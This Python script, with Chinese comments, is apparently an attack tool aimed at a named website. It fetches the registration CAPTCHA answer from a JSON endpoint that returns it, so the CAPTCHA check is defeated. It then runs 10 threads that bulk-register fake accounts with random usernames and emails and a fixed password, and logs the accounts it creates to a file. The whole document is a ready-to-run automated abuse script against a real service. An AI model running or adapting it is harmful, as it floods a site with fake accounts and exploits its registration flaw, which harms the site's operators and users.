import requests
import json
import random
import re
import threading
from datetime import datetime

print('[warning]Attack url:https://www.dzzyisp.com\n[notice]The threads is 10')
global number,sub
sub = int(0)
num = int(input('You want to create users amount(if you put 10,it will create 100 users.):'))

def register():
    i = int(0)
    #创建写入注册用户信息的文件
    f = open("FILE PATH",'a+')

    #自动化注册
    while i < num:
        headers = {

            "User-Agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.63 Safari/537.36 Edg/93.0.961.47",

            'cookie':'PHPSESSID=md65imf1d2av4k5497aaqj8jb6'

        }

    #获取验证码
        
        url_Getcode='https://www.dzzyisp.com/index.php?m=member&c=checklogin&a=get_code&k=Wed%20Oct%2006%202021%2011%3A36%3A01%20GMT%2B0800%20(%E4%B8%AD%E5%9B%BD%E6%A0%87%E5%87%86%E6%97%B6%E9%97%B4)40000'   
        resp=requests.get(url=url_Getcode,headers=headers)
        text=resp.text

        #从json中提取验证码
        jsonObj=json.loads(text)
        code = jsonObj['MSG']['code']
        
    #注册用户信息
        
        char_user = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ123456789'
        user=''.join(random.sample(char_user,random.randint(3,30)))+str(random.randint(10,100000)) # ''.join()将列表中的内容转换成字符串
        passwd='123.com'
        email=str(random.randint(100,2000000))+'@163.com'
        data ={
            'modelid':'10',
            'siteid':'1',
            'username':user,
            'password':passwd,
            'pwdconfirm':passwd,
            'email':email,
            'code':code,
            'dosubmit':'',
            'protocol':'1'
        }

    #批量注册
        
        url_Register='https://www.dzzyisp.com/index.php?m=member&c=index&a=register&siteid=1'
        resp1=requests.post(url_Register,data=data,headers=headers)
        print("[try] username: "+str(user)+" passwd: "+str(passwd)+' email:'+str(email))

        #获取注册页面信息
        res = re.findall(r'<div class="msg">(.*?)！',resp1.text)
        #print(res)
        
        #判断注册是否成功
        if(str(res) == "['操作成功']"):
            #记录
            f.write("username:%s password:%s\n" %(user,passwd))
            i += 1
            global sub
            sub += 1
        else:
            pass
    print('[pass]成功注册%d名用户' %(sub))
    f.close()

def thread():
    start = datetime.now()
    threads =[]
    
    #创建10个线程
    for _ in range(10):
        t = threading.Thread(target=register)
        threads.append(t)
    
    #启动10个线程
    for t in threads:
        t.start()
    durtime = datetime.now()-start
    print('[info]创建进程耗时'+str(durtime))

if __name__ == '__main__':
    thread()
    
    

   
 

    

